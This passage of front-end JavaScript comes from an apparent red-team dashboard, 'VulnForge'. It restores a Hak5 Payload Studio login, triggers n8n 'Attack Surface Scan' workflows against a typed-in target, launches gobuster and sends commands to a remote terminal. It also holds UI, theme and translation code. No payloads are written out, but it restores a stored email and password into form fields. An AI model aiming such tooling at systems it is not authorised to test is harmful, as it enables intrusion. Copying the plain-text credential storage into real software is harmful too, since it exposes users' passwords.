            document.getElementById('ps-email').value = saved.email || '';
            document.getElementById('ps-password').value = saved.password || '';
            updatePSStatus(true);
            const iframe = document.getElementById('ps-iframe');
            if (iframe) iframe.src = 'https://payloadstudio.hak5.org/';
        }
    }
    restorePSSession();

    // ============================================================
    //  N8N AUTOMATION
    // ============================================================

    // ── Load saved n8n URL ──
    function loadN8nUrl() {
        const saved = localStorage.getItem('vulnforge_n8n_url');
        const input = document.getElementById('n8n-url');
        if (saved && input) {
            input.value = saved;
        }
    }

    function saveN8nUrl() {
        const input = document.getElementById('n8n-url');
        if (input && input.value.trim()) {
            localStorage.setItem('vulnforge_n8n_url', input.value.trim());
        }
    }

    window.checkN8nStatus = async function () {
        const input = document.getElementById('n8n-url');
        const badge = document.getElementById('n8n-status-badge');
        const btn   = document.getElementById('btn-n8n-health');
        if (!input || !badge) return;

        const url = input.value.trim();
        if (!url) {
            badge.innerHTML = '⚠️ enter URL';
            badge.className = 'text-[9px] text-blood border border-blood/30 rounded px-2 py-1';
            return;
        }

        saveN8nUrl();
        btn.textContent = '⏳ Testing...';
        btn.disabled = true;
        badge.innerHTML = '⏳ testing...';
        badge.className = 'text-[9px] text-cyber border border-cyber/30 rounded px-2 py-1';

        try {
            const resp = await fetch(`/api/n8n/status?n8n_url=${encodeURIComponent(url)}`);
            const data = await resp.json();
            if (data.reachable) {
                badge.innerHTML = '🟢 reachable';
                badge.className = 'text-[9px] text-neon border border-neon/30 rounded px-2 py-1';
                showToast('✅ n8n server is reachable');
            } else {
                badge.innerHTML = '🔴 unreachable';
                badge.className = 'text-[9px] text-blood border border-blood/30 rounded px-2 py-1';
                showToast('❌ n8n server is not responding');
            }
        } catch (err) {
            badge.innerHTML = '⚠️ error';
            badge.className = 'text-[9px] text-blood border border-blood/30 rounded px-2 py-1';
            showToast(`⚠️ Connection test failed: ${err.message}`);
        } finally {
            btn.textContent = '🔍 Test';
            btn.disabled = false;
        }
    };

    window.triggerN8nScan = async function () {
        const urlInput   = document.getElementById('n8n-url');
        const targetInput = document.getElementById('n8n-target');
        const scanSelect = document.getElementById('n8n-scan-type');
        const btn        = document.getElementById('btn-n8n-trigger');
        const statusSpan = document.getElementById('n8n-scan-status');
        const logDiv     = document.getElementById('n8n-log');

        if (!urlInput || !targetInput || !scanSelect || !logDiv) return;

        const n8nUrl   = urlInput.value.trim();
        const target   = targetInput.value.trim();
        const scanType = scanSelect.value;

        if (!n8nUrl) {
            showToast('⚠️ Enter your n8n server URL first');
            return;
        }
        if (!target) {
            showToast('⚠️ Enter a target domain or IP');
            return;
        }

        saveN8nUrl();
        btn.disabled = true;
        btn.textContent = '⏳ Scanning...';
        statusSpan.textContent = '⏳ triggering workflow...';

        appendN8nLog(`[•] Triggering Attack Surface Scan on ${target} (${scanType})`);
        appendN8nLog(`[•] n8n URL: ${n8nUrl}`);

        try {
            const resp = await fetch('/api/n8n/trigger', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target: target,
                    scan_type: scanType,
                    n8n_url: n8nUrl
                })
            });
            const data = await resp.json();

            if (data.ok) {
                appendN8nLog(`[✓] Workflow triggered successfully (HTTP ${data.status})`);
                if (data.data) {
                    // Try to format as JSON if possible
                    try {
                        const parsed = JSON.parse(data.data);
                        appendN8nLog(`[=] Response: ${JSON.stringify(parsed, null, 2)}`);
                    } catch {
                        appendN8nLog(`[=] Response: ${data.data.substring(0, 500)}`);
                    }
                }
                statusSpan.textContent = '✅ Scan triggered';
                showToast(`✅ Attack Surface Scan triggered for ${target}`);
            } else {
                appendN8nLog(`[✗] Workflow failed (HTTP ${data.status}): ${data.error || 'unknown error'}`);
                statusSpan.textContent = '❌ Failed';
                showToast(`❌ Workflow trigger failed: ${data.error || 'unknown error'}`);
            }
        } catch (err) {
            appendN8nLog(`[✗] Error: ${err.message}`);
            statusSpan.textContent = '⚠️ Error';
            showToast(`⚠️ Trigger error: ${err.message}`);
        } finally {
            btn.disabled = false;
            btn.textContent = '▶ Trigger Scan';
        }
    };

    function appendN8nLog(msg) {
        const logDiv = document.getElementById('n8n-log');
        if (!logDiv) return;
        // Remove the placeholder text if still there
        if (logDiv.textContent.includes('No scans triggered yet')) {
            logDiv.textContent = '';
        }
        const line = document.createElement('div');
        line.textContent = msg;
        line.className = 'text-gray-400';
        logDiv.appendChild(line);
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    window.clearN8nLog = function () {
        const logDiv = document.getElementById('n8n-log');
        if (logDiv) {
            logDiv.textContent = '';
            const placeholder = document.createElement('span');
            placeholder.className = 'text-gray-700';
            placeholder.textContent = '[—] Log cleared.';
            logDiv.appendChild(placeholder);
        }
        document.getElementById('n8n-scan-status').textContent = '';
        showToast('✕ Log cleared');
    };

    // ── Init n8n ──
    loadN8nUrl();

    // ============================================================
    //  TOAST NOTIFICATIONS
    // ============================================================
    function showToast(msg) {
        const existing = document.querySelector('.toast');
        if (existing) existing.remove();
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.textContent = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }

    // ============================================================
    //  THEME TOGGLE (Monochrome Mode)
    // ============================================================
    window.toggleTheme = function () {
        const isMono = document.body.classList.toggle('monochrome');
        localStorage.setItem('vulnforge_theme', isMono ? 'mono' : 'neon');
        document.getElementById('theme-icon').textContent = isMono ? '◇' : '☾';
        showToast(isMono ? '◼ Monochrome mode' : '🟢 Neon mode');
    };

    // Load saved theme
    if (localStorage.getItem('vulnforge_theme') === 'mono') {
        document.body.classList.add('monochrome');
        document.getElementById('theme-icon').textContent = '◇';
    }

    // ============================================================
    //  LANGUAGE (ES/EN)
    // ============================================================
    const translations = {
        appName:           { en: 'VULNFORGE',       es: 'VULNFORGE' },
        headerTag:         { en: '/* Red Team */',   es: '/* Red Team */' },
        targetLabel:       { en: '>> Target_',       es: '>> Objetivo_' },
        targetPlaceholder: { en: '10.10.10.5 | domain.htb', es: '10.10.10.5 | dominio.htb' },
        connections:       { en: '>> Connections_',  es: '>> Conexiones_' },
        newConn:           { en: '+ New',            es: '+ Nueva' },
        selTarget:         { en: '-- Select target --', es: '-- Seleccionar --' },
        connAlias:         { en: 'Alias (eg: Kali-VPN)', es: 'Alias (ej: Kali-VPN)' },
        connIP:            { en: 'IP: 192.168.1.x',  es: 'IP: 192.168.1.x' },
        connUser:          { en: 'User',             es: 'Usuario' },
        connPass:          { en: 'Pass',             es: 'Contraseña' },
        btnSave:           { en: '✓ Save',           es: '✓ Guardar' },
        btnCancel:         { en: '✕ Cancel',         es: '✕ Cancelar' },
        arsenal:           { en: 'Arsenal',          es: 'Arsenal' },
        catWebRecon:       { en: 'Web Recon',        es: 'Web Recon' },
        catNetwork:        { en: 'Network',          es: 'Red' },
        catSMB:            { en: 'SMB / Windows',    es: 'SMB / Windows' },
        catPivoting:       { en: 'Pivoting',         es: 'Pivoting' },
        catCrypto:         { en: 'Crypto / Decode',  es: 'Crypto / Decod' },
        catExploitation:   { en: 'Exploitation',     es: 'Explotación' },
        catResources:      { en: 'Resources',        es: 'Recursos' },
        catUtilities:      { en: 'Utilities',        es: 'Utilidades' },
        tabTerminal:       { en: '⌨ Terminal',       es: '⌨ Terminal' },
        tabReports:        { en: '📊 Reports',       es: '📊 Informes' },
        tabScripts:        { en: '⚡ Scripts',       es: '⚡ Scripts' },
        tabBounty:         { en: '📋 Bounty',        es: '📋 Bounty' },
        tabAI:             { en: '🤖 AI Writeup',   es: '🤖 AI Writeup' },
        tabAutomation:     { en: '⚙ Automation',   es: '⚙ Automatización' },
        btnConnect:        { en: '> Connect',        es: '> Conectar' },
        btnDisconnect:     { en: '> Disconnect',     es: '> Desconectar' },
        cmdPlaceholder:    { en: '$  enter command...', es: '$  ingresa comando...' },
        btnExecute:        { en: '⏎',                es: '⏎' },
        modulesLoaded:     { en: 'modules loaded',   es: 'módulos cargados' },
        scanReports:       { en: '📊 Scan Reports',  es: '📊 Informes de Escaneo' },
        clearAll:          { en: '✕ clear all',      es: '✕ limpiar todo' },
        noReports:         { en: 'No reports yet',   es: 'Sin informes aún' },
        noReportsDesc:     { en: 'Run a scan from the Arsenal to see results here', es: 'Ejecuta un escaneo desde el Arsenal' },
        templates:         { en: 'Templates',        es: 'Plantillas' },
        editor:            { en: 'EDITOR',           es: 'EDITOR' },
        deployRun:         { en: '⬆ Deploy & Run',  es: '⬆ Desplegar & Ejec' },
        bountyTitle:       { en: '📋 Bug Bounty Report Generator', es: '📋 Generador de Reportes Bounty' },
        aiTitle:           { en: '🤖 AI Writeup Generator', es: '🤖 Generador de Writeups IA' },
        apiConfig:         { en: '⚙ API Configuration', es: '⚙ Configuración API' },
        genReport:         { en: '⚡ Generate Report', es: '⚡ Generar Reporte' },
        downloadMD:        { en: '⬇ Download .md',  es: '⬇ Descargar .md' },
        genWriteup:        { en: '🤖 Generate Writeup', es: '🤖 Generar Writeup' },
        offline:           { en: 'OFFLINE',          es: 'DESCONECTADO' },
        online:            { en: 'ONLINE',           es: 'CONECTADO' },
        disconnected:      { en: 'disconnected',     es: 'desconectado' },
        connected:         { en: 'connected',        es: 'conectado' },
    };

    window.currentLang = localStorage.getItem('vulnforge_lang') || 'en';

    window.switchLanguage = function () {
        window.currentLang = window.currentLang === 'en' ? 'es' : 'en';
        localStorage.setItem('vulnforge_lang', window.currentLang);
        applyLanguage(window.currentLang);
        document.getElementById('lang-text').textContent = window.currentLang.toUpperCase();
        showToast(`🌐 Language: ${window.currentLang === 'en' ? 'English' : 'Español'}`);
    };

    function applyLanguage(lang) {
        document.documentElement.lang = lang;

        // Update all data-i18n elements
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.getAttribute('data-i18n');
            if (translations[key] && translations[key][lang]) {
                el.textContent = translations[key][lang];
            }
        });

        // Update title
        document.title = `VulnForge — ${lang === 'en' ? 'Red Team Dashboard' : 'Panel Red Team'}`;

        // Update placeholders
        const targetPlaceholder = translations.targetPlaceholder[lang];
        const targetInput = document.getElementById('target-ip');
        if (targetInput) targetInput.placeholder = targetPlaceholder;

        const cmdInput = document.getElementById('cmd-input');
        if (cmdInput) cmdInput.placeholder = translations.cmdPlaceholder[lang];

        // Update connection selector
        const connSel = document.getElementById('conn-selector');
        if (connSel) {
            const firstOpt = connSel.querySelector('option:first-child');
            if (firstOpt) firstOpt.textContent = translations.selTarget[lang];
        }

        // Update connection form placeholders
        const connName = document.getElementById('new-conn-name');
        if (connName) connName.placeholder = translations.connAlias[lang];
        const connIP = document.getElementById('new-conn-ip');
        if (connIP) connIP.placeholder = translations.connIP[lang];
        const connUser = document.getElementById('new-conn-user');
        if (connUser) connUser.placeholder = translations.connUser[lang];
        const connPass = document.getElementById('new-conn-pass');
        if (connPass) connPass.placeholder = translations.connPass[lang];

        // Update new connection buttons
        const saveBtn = document.querySelector('#add-conn-form button:first-child');
        if (saveBtn) saveBtn.textContent = translations.btnSave[lang];
        const cancelBtn = document.querySelector('#add-conn-form button:last-child');
        if (cancelBtn) cancelBtn.textContent = translations.btnCancel[lang];

        // Update empty report state
        const reportEmpty = document.querySelector('.report-empty');
        if (reportEmpty) {
            const nodes = reportEmpty.children;
            if (nodes[1]) nodes[1].textContent = translations.noReports[lang];
            if (nodes[2]) nodes[2].textContent = translations.noReportsDesc[lang];
        }
    }

    // Apply saved language on load
    if (window.currentLang === 'es') {
        document.getElementById('lang-text').textContent = 'ES';
        applyLanguage('es');
    } else {
        document.getElementById('lang-text').textContent = 'EN';
        applyLanguage('en');
    }

    // ============================================================
    //  EVENT LISTENERS
    // ============================================================
    btnConnect.addEventListener('click', connectWS);
    btnDisconnect.addEventListener('click', disconnectWS);
    btnSend.addEventListener('click', window.sendCommand);

    cmdInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') window.sendCommand();
    });

    targetInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') window.launchTool('gobuster');
    });

    // ── Init ──
    loadConnections();
    loadSavedScripts();
    loadAIConfig();
    window.appendBanner();
});
